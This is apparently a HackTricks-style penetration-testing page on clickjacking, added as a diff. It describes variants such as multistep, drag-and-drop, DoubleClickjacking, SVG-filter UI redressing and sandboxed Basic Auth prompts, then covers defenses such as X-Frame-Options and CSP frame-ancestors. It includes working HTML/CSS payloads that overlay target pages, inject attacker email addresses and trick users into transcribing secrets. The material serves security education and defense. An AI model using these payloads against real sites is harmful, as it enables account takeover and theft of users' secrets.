@@ -1,0 +1,335 @@
+# Clickjacking
+
+{{#include ../banners/hacktricks-training.md}}
+
+## What is Clickjacking
+
+In a clickjacking attack, a **user** is **tricked** into **clicking** an **element** on a webpage that is either **invisible** or disguised as a different element. This manipulation can lead to unintended consequences for the user, such as the downloading of malware, redirection to malicious web pages, provision of credentials or sensitive information, money transfers, or the online purchasing of products.<sup>[[1]](#references)</sup>
+
+### Prepopulate forms trick
+
+Sometimes it is possible to **prepopulate form fields with query parameters when loading a page**. An attacker may combine this behavior with clickjacking so the victim only has to press the submit button.
+
+### Populate form with Drag\&Drop
+
+If a victim must **fill a form** with attacker-chosen data, a drag-and-drop interaction can write controlled text into the framed form without asking the victim to type it directly.<sup>[[9]](#references)</sup>
+
+### Basic Payload
+
+```css
+<style>
+   iframe {
+       position:relative;
+       width: 500px;
+       height: 700px;
+       opacity: 0.1;
+       z-index: 2;
+   }
+   div {
+       position:absolute;
+       top:470px;
+       left:60px;
+       z-index: 1;
+   }
+</style>
+<div>Click me</div>
+<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
+```
+
+### Multistep Payload
+
+```css
+<style>
+   iframe {
+       position:relative;
+       width: 500px;
+       height: 500px;
+       opacity: 0.1;
+       z-index: 2;
+   }
+   .firstClick, .secondClick {
+       position:absolute;
+       top:330px;
+       left:60px;
+       z-index: 1;
+   }
+   .secondClick {
+       left:210px;
+   }
+</style>
+<div class="firstClick">Click me first</div>
+<div class="secondClick">Click me next</div>
+<iframe src="https://vulnerable.net/account"></iframe>
+```
+
+### Drag\&Drop + Click payload
+
+```css
+<html>
+<head>
+<style>
+#payload{
+position: absolute;
+top: 20px;
+}
+iframe{
+width: 1000px;
+height: 675px;
+border: none;
+}
+.xss{
+position: fixed;
+background: #F00;
+}
+</style>
+</head>
+<body>
+<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
+<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
+<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
+<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
+<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
+</body>
+</html>
+```
+
+### XSS + Clickjacking
+
+If you have identified an **XSS attack that requires a user to click** on some element to **trigger** the XSS and the page is **vulnerable to clickjacking**, you could abuse it to trick the user into clicking the button/link.\
+Example:\
+You found a **self XSS** in some private details of the account (details that **only you can set and read**). The page with the **form** to set these details is **vulnerable** to **Clickjacking** and you can **prepopulate** the **form** with the GET parameters.\
+An attacker could prepare a **Clickjacking** attack to that page **prepopulating** the **form** with the **XSS payload** and **tricking** the **user** into **Submit** the form. So, **when the form is submitted** and the values are modified, the **user will execute the XSS**.
+
+
+### DoubleClickjacking
+
+DoubleClickjacking asks the victim to double-click an attacker-controlled button, then uses the timing gap between `mousedown` and `click` to place the target page under the pointer so the second click lands on a legitimate target control.<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup>
+
+An example could be seen in this video: [https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)
+
+A code example can be found in [this page](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html).<sup>[[10]](#references)</sup>
+
+> [!WARNING]
+> This technique allows to trick the user to click on 1 place in the victim page bypassing every protection against clickjacking. So the attacker needs to find **sensitive actions that can be done with just 1 click, like OAuth prompts accepting permissions**.
+
+
+#### Popup-based DoubleClickjacking (no iframes)
+
+Some PoCs abandon iframes entirely and keep a **background popup** aligned under the cursor. The attacker page tracks `mousemove` and uses a small popup (`window.open`) that is moved with `moveTo()` while it is **same-origin**; once aligned, it is redirected back to the **target origin** so the next click lands on the real button. Because cross‑origin `moveTo()` is blocked, the popup is briefly navigated to an attacker origin for repositioning, then `location`/`history.back()` returns to the target. To surface the target at click time, the attacker can re‑open the popup **with the same window name** to bring it to the foreground without changing the URL.<sup>[[10]](#references)</sup>
+
+```html
+<script>
+let w;
+onclick = () => {
+  if (!w) w = window.open('/shim', 'pj', 'width=360,height=240');
+  onmousemove = e => { try { w.moveTo(e.screenX, e.screenY); } catch {} };
+  // When ready, refocus the already-loaded popup
+  window.open('', 'pj');
+};
+</script>
+```
+
+### SVG Filters / Cross-Origin Iframe UI Redressing
+
+Modern Chromium/WebKit/Gecko builds let CSS `filter:url(#id)` be applied to cross-origin iframes. The iframe’s rasterized pixels are exposed to the SVG filter graph as `SourceGraphic`, so primitives such as `feDisplacementMap`, `feBlend`, `feComposite`, `feColorMatrix`, `feTile`, `feMorphology`, etc. can arbitrarily warp the victim UI before the user sees it, even though the attacker never touches the DOM.<sup>[[4]](#references)</sup> A simple Liquid-Glass style filter looks like:
+
+```html
+<iframe src="https://victim.example" style="filter:url(#displacementFilter4)"></iframe>
+```
+
+* Useful primitives: `feImage` loads attacker bitmaps (e.g., overlays, displacement maps); `feFlood` builds constant-color mattes; `feOffset/feGaussianBlur` refine highlights; `feDisplacementMap` refracts/warps text; `feComposite operator="arithmetic"` implements arbitrary per-channel math (`r = k1*i1*i2 + k2*i1 + k3*i2 + k4`), which is enough for contrast boosting, masking, and AND/OR operations; `feTile` crops and replicates pixel probes; `feMorphology` grows/shrinks strokes; `feColorMatrix` moves luma into alpha to build precise masks.
+
+#### Distorting secrets into CAPTCHA-style prompts
+
+If a framable endpoint renders secrets (tokens, reset codes, API keys), the attacker can distort them so they resemble a CAPTCHA and coerce manual transcription:
+
+```html
+<svg width="0" height="0">
+  <filter id="captchaFilter">
+    <feTurbulence type="turbulence" baseFrequency="0.03" numOctaves="4" result="noise" />
+    <feDisplacementMap in="SourceGraphic" in2="noise" scale="6" xChannelSelector="R" yChannelSelector="G" />
+  </filter>
+</svg>
+<iframe src="https://victim" style="filter:url(#captchaFilter)"></iframe>
+<input pattern="^6c79 ?7261 ?706f ?6e79$" required>
+```
+
+The distorted pixels fool the user into “solving” the captcha inside the attacker-controlled `<input>` whose `pattern` enforces the real victim secret.
+
+#### Recontextualizing victim inputs
+
+Filters can surgically delete placeholder/validation text while keeping user keystrokes. One workflow:
+
+1. `feComposite operator="arithmetic" k2≈4` amplifies brightness so grey helper text saturates to white.
+2. `feTile` limits the working area to the input rectangle.
+3. `feMorphology operator="erode"` thickens the dark glyphs typed by the victim and stores them via `result="thick"`.
+4. `feFlood` creates a white plate, `feBlend mode="difference"` with `thick`, and a second `feComposite k2≈100` turns it into a stark luma matte.
+5. `feColorMatrix` moves that luma into alpha, and `feComposite in="SourceGraphic" operator="in"` keeps only user-entered glyphs.
+6. Another `feBlend in2="white"` plus a thin crop gives a clean textbox, after which the attacker overlays their own HTML labels (e.g., “Enter your email”) while the hidden iframe still enforces the victim origin’s password policy.
+
+Safari struggles with `feTile`; the same effect can be reproduced with spatial mattes built from `feFlood` + `feColorMatrix` + `feComposite` for WebKit-only payloads.
+
+#### Pixel probes, logic and state machines
+
+By cropping a 2–4 px region with `feTile` and tiling it to `100%` of the viewport, the attacker transforms the sampled color into a full-frame texture that can be thresholded into a boolean mask:
+
+```html
+<filter id="pixelProbe">
+  <feTile x="313" y="141" width="4" height="4" />
+  <feTile x="0" y="0" width="100%" height="100%" result="probe" />
+  <feComposite in="probe" operator="arithmetic" k2="120" k4="-1" />
+  <feColorMatrix type="matrix" values="0 0 0 0 0  0 0 0 0 0  0 0 0 0 0  0 0 1 0 0" result="mask" />
+  <feGaussianBlur in="SourceGraphic" stdDeviation="2" />
+  <feComposite operator="in" in2="mask" />
+  <feBlend in2="SourceGraphic" />
+</filter>
+```
+
+For arbitrary colors, a `feFlood` reference (e.g., `#0B57D0`) plus `feBlend mode="difference"` and another arithmetic composite (`k2≈100`, `k4` as tolerance) outputs white only when the sampled pixel matches the target shade. Feeding these masks into `feComposite` with tuned `k1..k4` yields logic gates: `AND` via `k1=1`, `OR` via `k2=k3=1`, `XOR` via `feBlend mode="difference"`, `NOT` via blending against white. Chaining gates makes a full adder inside the filter graph, proving the pipeline is functionally complete.
+
+Attackers can therefore read UI state without JavaScript. Example booleans from a modal workflow:
+
+- **D** (dialog visible): probe a darkened corner and test against white.
+- **L** (dialog loaded): probe the coordinates where the button appears once ready.
+- **C** (checkbox checked): compare the checkbox pixel against the active blue `#0B57D0`.
+- **R** (red success/failure banner): use `feMorphology` and red thresholds inside the banner rectangle.
+
+Each detected state gates a different overlay bitmap embedded via `feImage xlink:href="data:..."`. Masking those bitmaps with `D`, `L`, `C`, `R` keeps the overlays synchronized with the real dialog and walks the victim through multi-step workflows (password resets, approvals, destructive confirmations) without ever exposing the DOM.
+
+### Sandboxed iframe Basic Auth dialog (no allow-popups)
+
+A sandboxed iframe without `allow-popups` can still surface a browser-controlled **HTTP Basic Authentication modal** when a load returns `401` with `WWW-Authenticate`. The dialog is spawned by the browser’s networking/auth layer (not JS `alert/prompt/confirm`), so popup restrictions in the sandbox do **not** suppress it. If you can script the iframe (e.g., `sandbox="allow-scripts"`) you can navigate it to any endpoint issuing a Basic Auth challenge:
+
+```html
+<iframe id="basic" sandbox="allow-scripts"></iframe>
+<script>
+  basic.src = "https://httpbin.org/basic-auth/user/pass"
+</script>
+```
+
+Once the response arrives, the browser prompts for credentials even though popups are disallowed. Framing a trusted origin with this trick enables UI redress/phishing: unexpected modal prompts inside a "sandboxed" widget can confuse users or trigger password managers to offer stored credentials.<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup><sup>[[7]](#references)</sup>
+
+### Browser extensions: DOM-based autofill clickjacking
+
+Aside from iframing victim pages, attackers can target browser extension UI elements that are injected into the page. Password managers render autofill dropdowns near focused inputs; by focusing an attacker-controlled field and hiding/occluding the extension’s dropdown (opacity/overlay/top-layer tricks), a coerced user click can select a stored item and fill sensitive data into attacker-controlled inputs. This variant requires no iframe exposure and works entirely via DOM/CSS manipulation.<sup>[[3]](#references)</sup>
+
+
+A real-world case: Dashlane disclosed a passkey dialog clickjacking issue (Aug 2025) where **XSS on the relying-party domain** allowed an attacker to overlay HTML over the extension’s passkey dialog. A click on the attacker’s element would proceed with the legitimate passkey login (the passkey itself isn’t exposed), effectively turning a UI-redress into account access if the RP is already vulnerable to script injection.<sup>[[8]](#references)</sup>
+
+- For concrete techniques and PoCs see:
+{{#ref}}
+browser-extension-pentesting-methodology/browext-clickjacking.md
+{{#endref}}
+
+## Strategies to Mitigate Clickjacking
+
+### Client-Side Defenses
+
+Scripts executed on the client side can perform actions to prevent Clickjacking:
+
+- Ensuring the application window is the main or top window.
+- Making all frames visible.
+- Preventing clicks on invisible frames.
+- Detecting and alerting users to potential Clickjacking attempts.
+
+However, these frame-busting scripts may be circumvented:
+
+- **Browsers' Security Settings:** Some browsers might block these scripts based on their security settings or lack of JavaScript support.
+- **HTML5 iframe `sandbox` Attribute:** An attacker can neutralize frame buster scripts by setting the `sandbox` attribute with `allow-forms` or `allow-scripts` values without `allow-top-navigation`. This prevents the iframe from verifying if it is the top window, e.g.,
+
+```html
+<iframe
+  id="victim_website"
+  src="https://victim-website.com"
+  sandbox="allow-forms allow-scripts"></iframe>
+```
+
+The `allow-forms` and `allow-scripts` values enable actions within the iframe while disabling top-level navigation. To ensure the intended functionality of the targeted site, additional permissions like `allow-same-origin` and `allow-modals` might be necessary, depending on the attack type. Browser console messages can guide which permissions to allow.<sup>[[2]](#references)</sup>
+
+### Server-Side Defenses
+
+#### X-Frame-Options
+
+The **`X-Frame-Options` HTTP response header** informs browsers about the legitimacy of rendering a page in a `<frame>` or `<iframe>`, helping to prevent Clickjacking:
+
+- `X-Frame-Options: deny` - No domain can frame the content.
+- `X-Frame-Options: sameorigin` - Only the current site can frame the content.
+- `X-Frame-Options: allow-from https://trusted.com` - Only the specified 'uri' can frame the page.
+  - Note the limitations: if the browser doesn't support this directive, it might not work. Some browsers prefer the CSP frame-ancestors directive.
+
+#### Content Security Policy (CSP) frame-ancestors directive
+
+**`frame-ancestors` directive in CSP** is the advised method for Clickjacking protection:
+
+- `frame-ancestors 'none'` - Similar to `X-Frame-Options: deny`.
+- `frame-ancestors 'self'` - Similar to `X-Frame-Options: sameorigin`.
+- `frame-ancestors trusted.com` - Similar to `X-Frame-Options: allow-from`.
+
+For instance, the following CSP only allows framing from the same domain:
+
+`Content-Security-Policy: frame-ancestors 'self';`
+
+Further details and complex examples can be found in the [frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) and [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).
+
+### Content Security Policy (CSP) with `child-src` and `frame-src`
+
+**Content Security Policy (CSP)** is a security measure that helps in preventing Clickjacking and other code injection attacks by specifying which sources the browser should allow to load content.
+
+#### `frame-src` Directive
+
+- Defines valid sources for frames.
+- More specific than the `default-src` directive.
+
+```
+Content-Security-Policy: frame-src 'self' https://trusted-website.com;
+```
+
+This policy allows frames from the same origin (self) and https://trusted-website.com.
+
+#### `child-src` Directive
+
+- Introduced in CSP level 2 to set valid sources for web workers and frames.
+- Acts as a fallback for frame-src and worker-src.
+
+```
+Content-Security-Policy: child-src 'self' https://trusted-website.com;
+```
+
+This policy allows frames and workers from the same origin (self) and https://trusted-website.com.
+
+**Usage Notes:**
+
+- Deprecation: child-src is being phased out in favor of frame-src and worker-src.
+- Fallback Behavior: If frame-src is absent, child-src is used as a fallback for frames. If both are absent, default-src is used.
+- Strict Source Definition: Include only trusted sources in the directives to prevent exploitation.
+
+#### JavaScript Frame-Breaking Scripts
+
+Although not completely foolproof, JavaScript-based frame-busting scripts can be used to prevent a web page from being framed. Example:
+
+```javascript
+if (top !== self) {
+  top.location = self.location
+}
+```
+
+#### Employing Anti-CSRF Tokens
+
+- **Token Validation:** Use anti-CSRF tokens in web applications to ensure that state-changing requests are made intentionally by the user and not through a Clickjacked page.
+
+## References
+
+- [1] [Clickjacking (PortSwigger Web Security Academy)](https://portswigger.net/web-security/clickjacking)
+- [2] [Clickjacking Defense Cheat Sheet (OWASP)](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
+- [3] [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)
+- [4] [SVG Filters - Clickjacking 2.0](https://lyra.horse/blog/2025/12/svg-clickjacking/)
+- [5] [Iframe sandbox Basic Auth modal](https://phor3nsic.github.io/2026/01/21/trick-iframe-sandbox.html)
+- [6] [Chromestatus: Restrict sandboxed frame dialogs](https://chromestatus.com/feature/4747009953103872)
+- [7] [Chromium issue about sandboxed auth dialogs](https://issues.chromium.org/issues/40266321)
+- [8] [Dashlane passkey dialog clickjacking advisory](https://support.dashlane.com/hc/en-us/articles/28598967624722-Security-advisory-Passkey-Dialog-Clickjacking-Issue)
+- [9] [Clickjacking to Account Takeover via Drag&Drop](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/)
+- [10] [DoubleClickjacking: a New Era of UI Redressing (Paulos Yibelo)](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html)
+- [11] [DoubleClickjacking: Clickjacking on major websites (Security Affairs)](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html)
+- [12] [DoubleClickjacking PoC details (evil.blog)](https://www.evil.blog/2024/12/doubleclickjacking-what.html)
+
+{{#include ../banners/hacktricks-training.md}}
